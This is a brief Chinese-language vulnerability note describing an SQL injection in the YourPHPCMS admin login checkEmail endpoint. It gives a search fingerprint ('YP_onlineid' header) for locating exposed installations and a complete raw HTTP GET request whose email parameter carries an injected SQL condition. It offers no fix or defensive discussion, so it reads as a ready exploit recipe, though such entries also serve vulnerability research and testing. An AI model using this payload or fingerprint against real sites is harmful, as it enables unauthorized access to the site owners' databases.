# YourPHPCMS login_checkEmail存在sql注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">YourPHPCMS login_checkEmail存在sql注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ YourPHPCMS

# 三、资产测绘
```rust
header="YP_onlineid"
```

![1732274946081-2fa7b36f-5b27-464c-899e-b80b63981e17.png](./img/RDkgNNSh_hl5-i_H/1732274946081-2fa7b36f-5b27-464c-899e-b80b63981e17-263714.png)

# 四、漏洞复现
```rust
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```

![1732274927301-ad8d704f-9b24-4757-a70a-01095646ed2a.png](./img/RDkgNNSh_hl5-i_H/1732274927301-ad8d704f-9b24-4757-a70a-01095646ed2a-852294.png)



> 更新: 2024-11-27 10:00:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/edbg83z8v9qn2mic>